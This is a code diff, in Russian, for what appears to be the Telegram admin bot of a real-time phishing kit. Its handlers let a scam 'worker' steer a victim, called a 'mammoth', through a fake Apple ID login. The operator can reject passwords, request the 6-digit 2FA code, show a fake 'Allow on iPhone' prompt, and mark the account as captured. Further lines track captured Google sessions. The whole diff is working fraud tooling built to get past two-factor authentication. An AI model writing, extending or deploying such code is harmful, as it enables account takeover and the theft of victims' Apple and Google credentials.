@@ -685,6 +685,12 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
             session_status = "🟢 E2E Сессия активна (онлайн)"
     elif raw_session and raw_session.startswith("google_auth_"):
         session_status = "🟢 Google OAuth сессия активна"
+    elif auth_step in ("google_prompt_confirmed", "google_complete", "google_authorized") or (email and ("google_status" in user.keys() and user["google_status"] == "prompt_confirmed")):
+        session_status = "🟢 Google сессия подтверждена (онлайн)"
+    elif raw_session and raw_session.startswith("apple_auth_"):
+        session_status = "🟢 Apple ID сессия активна"
+    elif auth_step in ("apple_authorized", "apple_complete", "apple_prompt_confirmed") or (email and ("apple_status" in user.keys() and user["apple_status"] in ("completed", "prompt_confirmed", "authorized"))):
+        session_status = "🟢 Apple ID сессия подтверждена (онлайн)"
     elif auth_step in ("session_revoked", "logged_out"):
         session_status = "❌ Сессия сброшена / отозвана"
     else:
@@ -2796,6 +2802,114 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
             details="Воркер/Админ подтвердил успешный вход Google",
             is_test=True,
         )
+
+
+@router.callback_query(F.data.startswith("actrl:"))
+async def handle_apple_control_callback(callback: CallbackQuery, bot: Bot):
+    parts = callback.data.split(":")
+    if len(parts) < 3:
+        await callback.answer("Ошибка формата кнопки", show_alert=True)
+        return
+
+    action = parts[1]
+    try:
+        target_tg_id = int(parts[2])
+    except ValueError:
+        await callback.answer("Неверный ID мамонта", show_alert=True)
+        return
+
+    if action == "wrong_pass":
+        db.set_apple_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="error_password",
+            error_msg="Неверный Apple ID или пароль.",
+        )
+        await callback.answer("❌ Мамонту отправлена ошибка 'Неверный Apple ID или пароль'", show_alert=True)
+        await notify_user_event(
+            event_type="apple_wrong_password",
+            user_tg_id=target_tg_id,
+            details="Воркер/Админ отклонил пароль Apple ID",
+            is_test=True,
+        )
+
+    elif action == "correct_pass":
+        db.set_apple_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="correct_password",
+            error_msg=None,
+        )
+        await callback.answer("✅ Пароль Apple ID подтверждён", show_alert=True)
+        await notify_user_event(
+            event_type="apple_password_correct",
+            user_tg_id=target_tg_id,
+            details="Воркер/Админ подтвердил верный пароль Apple ID",
+            is_test=True,
+        )
+
+    elif action == "ask_code":
+        db.set_apple_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="ask_code",
+            error_msg=None,
+        )
+        await callback.answer("🔢 На экран мамонта выведен ввод 6-значного 2FA кода Apple", show_alert=True)
+        await notify_user_event(
+            event_type="apple_ask_code",
+            user_tg_id=target_tg_id,
+            details="Запрошен 6-значный 2FA код Apple ID",
+            is_test=True,
+        )
+
+    elif action == "wrong_code":
+        db.set_apple_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="error_code",
+            error_msg="Неверный код проверки. Повторите попытку.",
+        )
+        await callback.answer("❌ Ошибка неверного 2FA кода отправлена мамонту", show_alert=True)
+        await notify_user_event(
+            event_type="apple_wrong_code",
+            user_tg_id=target_tg_id,
+            details="Воркер/Админ отклонил 2FA код Apple (Неверный код)",
+            is_test=True,
+        )
+
+    elif action == "ask_prompt":
+        db.set_apple_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="ask_prompt",
+            error_msg=None,
+        )
+        await callback.answer("📲 На экран мамонта выведено системное окно 'Разрешить на iPhone'", show_alert=True)
+        await notify_user_event(
+            event_type="apple_ask_prompt",
+            user_tg_id=target_tg_id,
+            details="Мамонту отправлен запрос подтверждения на устройстве (Разрешить)",
+            is_test=True,
+        )
+
+    elif action == "complete":
+        db.set_apple_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="completed",
+        )
+        db.set_user_session(DB_PATH, target_tg_id, f"apple_auth_{target_tg_id}")
+        db.set_user_auth_step(DB_PATH, target_tg_id, "apple_authorized")
+        await callback.answer("🎉 Авторизация Apple ID подтверждена!", show_alert=True)
+        await notify_user_event(
+            event_type="apple_complete",
+            user_tg_id=target_tg_id,
+            auth_step="apple_authorized",
+            details="Воркер/Админ подтвердил успешный вход Apple ID",
+            is_test=True,
+        )
+
 
 
 @router.message(F.text)
